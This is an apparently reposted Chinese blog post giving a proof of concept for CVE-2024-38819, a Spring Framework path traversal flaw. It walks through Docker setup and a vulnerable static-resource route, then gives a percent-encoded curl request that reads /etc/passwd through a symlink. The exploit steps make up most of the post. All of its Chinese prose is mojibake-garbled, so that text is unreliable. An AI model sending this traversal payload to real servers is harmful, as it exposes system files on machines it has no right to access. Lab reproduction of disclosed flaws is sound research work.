#  ã€Pocã€‘-Spring Frameworkè·¯å¾„éå†æ¼æ´(CVE-2024-38819)   
åŸåˆ› å®¬å®¤å¸é˜  åŸ‹è—é…±æ²¹ç“¶   2024-12-16 05:38  
  
## ã€ğŸ””ã€‘äº’è”ç½‘èµ„æ–™/å·¥å…·ï¼Œå®‰å…¨æ€§æœªçŸ¥ï¼Œéœ€è¦è‡ªè¡Œç ”åˆ¤å®‰å…¨æ€§ã€‚  
# CVE-2024-38819: PoC  
> Poc:  
> curl http://localhost:8080/static/link/%2e%2e/etc/passwd  
  
# Pocç¯å¢ƒéªŒè¯  
### 1. æ„å»ºé•œåƒ  
> doker é•œåƒï¼ˆSpring Boot 3.3.4ï¼ŒåŸºäº Spring Framework 6.1.13ï¼‰  
  
```
cd vuln
docker buildÂ -t cve-2024-38819-pocÂ .
```  
### 2. è¿è¡ŒæœåŠ¡  
> è¿è¡Œå®¹å™¨å¹¶å°†ç«¯å£ 8080 æš´éœ²ç»™ä¸»æœº  
  
```
docker runÂ -dÂ -pÂ 8080:8080Â --name cve-2024-38819-poc cve-2024-38819-poc
```  
### 3. è¿è¡ŒPoc  
> è¿è¡Œä»¥ä¸‹å‘½ä»¤æ‰§è¡ŒPoCå¹¶ç¡®è®¤æ¼æ´  
  
```
curl http://localhost:8080/static/link/%2e%2e/etc/passwd
```  
  
å¦‚æœæ”»å‡»æˆåŠŸï¼Œå°±ä¼šæ˜¾ç¤ºÂ **/etc/passwd**  
Â æ–‡ä»¶çš„å†…å®¹ã€‚  
## Explanation  
> 1. ä½¿ç”¨ä»¥ä¸‹ä»£ç åˆ›å»º PathTraversalDemoApplication.java ä»¥ä½¿ç”¨ RouterFunction å’Œ FileSystemResource è®¾ç½®é™æ€æ–‡ä»¶è·¯ç”±ï¼š  
  
```
publicÂ RouterFunction<ServerResponse>Â staticResourceRouter()Â {
Â  Â Â returnÂ RouterFunctions.resources("/static/**",Â newÂ FileSystemResource("/app/static/"));
}
```  
> 1. å°†ä»¥ä¸‹å‘½ä»¤æ·»åŠ åˆ° Dockerfile ä»¥åˆ›å»ºç¬¦å·é“¾æ¥ï¼š  
  
```
RUN lnÂ -sÂ /staticÂ /app/static/link
```  
> 1. åˆ›å»ºä¸€ä¸ªæœ‰æ•ˆè´Ÿè½½ï¼Œåˆ©ç”¨ç™¾åˆ†æ¯”ç¼–ç é€šè¿‡ç¬¦å·é“¾æ¥éå†ç›®å½•ã€‚  
  
```
Path:Â `/static/link/%2e%2e/etc/passwd`
```  
> 1. ä½¿ç”¨ä»¥ä¸‹ curl å‘½ä»¤æ‰§è¡ŒPoCå¹¶éªŒè¯æ”»å‡»æ˜¯å¦æˆåŠŸï¼š  
  
```
curl http://localhost:8080/static/link/%2e%2e/etc/passwd
```  
  
å¦‚æœæ”»å‡»æˆåŠŸï¼Œå°±ä¼šæ˜¾ç¤ºÂ **/etc/passwd**  
Â æ–‡ä»¶çš„å†…å®¹ã€‚  
## é¡¹ç›®åœ°å€  
1. 1.Â   
ã€ä»“åº“ã€‘https://github.com/masa42/CVE-2024-38819-POC  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/aOiar7mEUNlqIeYPL63ftuHYOg5LA6Izamo9VLniaX7pBCa2ATgAoIhOm8DuWwGa17csZQkM3fvZ9vjLCZnI37xA/640?wx_fmt=jpeg&from=appmsg "")  
  
  
